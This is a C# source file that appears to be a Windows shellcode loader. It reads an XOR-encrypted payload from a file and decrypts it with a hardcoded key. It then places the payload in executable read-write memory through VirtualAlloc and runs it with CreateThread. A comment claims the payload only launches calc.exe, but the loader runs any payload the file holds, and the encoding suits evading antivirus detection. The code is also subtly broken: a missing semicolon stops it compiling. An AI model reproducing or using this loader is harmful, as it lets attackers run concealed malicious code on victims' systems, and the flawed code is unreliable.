using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace ShellExec
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // shellcode for calc.exe
            byte[] xoredcode = File.ReadAllBytes("encrypted.txt");
            byte[] shellcode = XorAll(xoredcode);

            UInt32 fAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)fAddr, shellcode.Length);
            
            IntPtr thread = IntPtr.Zero;
            UInt32 thrId = 0;
            IntPtr param = IntPtr.Zero;

            thread = CreateThread(0, 0, fAddr, param, 0, ref thrId);
            WaitForSingleObject(thread, 0xFFFFFFFF);
            return;
          }

        static byte[] XorAll(byte[] payload)
        {
            // key hardcoded
            byte[] key = Encoding.ASCII.GetBytes("passkey");
            byte[] tempByte = new byte[payload.Length];

            for (int i = 0; i < payload.Length; i++)
            {
                tempByte[i] = (byte)(payload[i] ^ key[i % key.Length]);
            }
            return tempByte
        }
    }
}
